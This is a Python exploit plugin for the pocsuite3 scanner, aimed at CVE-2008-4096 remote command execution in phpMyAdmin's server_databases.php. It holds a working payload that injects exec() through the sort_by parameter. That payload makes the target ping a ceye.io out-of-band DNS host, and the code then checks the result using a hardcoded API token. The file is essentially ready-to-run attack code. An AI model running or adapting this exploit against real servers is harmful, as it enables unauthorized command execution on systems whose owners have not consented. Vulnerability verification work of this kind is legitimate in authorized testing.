#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import requests
from pocsuite3.lib.utils import random_str

class PhpMyAdmin(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-13'
    updateDate = '2019-11-13'
    references = ['']
    name = 'phpMyAdmin 3.2 - "server_databases.php" Remote Command Execution (CVE-2008-4096)'
    appPowerLink = 'phpMyAdmin'
    appName = 'phpMyAdmin'
    appVersion = '<= 2.11.9.1'
    vulType = 'rce'
    desc = ''' 
    This issue affects versions prior to phpMyAdmin 2.11.9.1
    '''

    def _options(self):
        o = OrderedDict()
        o['token'] = OptString('', description='这个poc需要输入token', require=True)
        return o

    def _verify(self):
        result = {}
        token = self.get_option('token')
        cmd = random_str(16) + '.6eb4yw.ceye.io'
        cmd2 = 'ping ' + cmd
        payload = 'server_databases.php?pos=0&dbstats=0&sort_by="]) OR exec("%s"); //&sort_order=desc&token=%s' % (cmd2, token)
        try:
            if self.url[-1] == '/':
                url = self.url + payload
            else:
                url = self.url + '/' + payload
            requests.get(url=url)
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if cmd in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(PhpMyAdmin)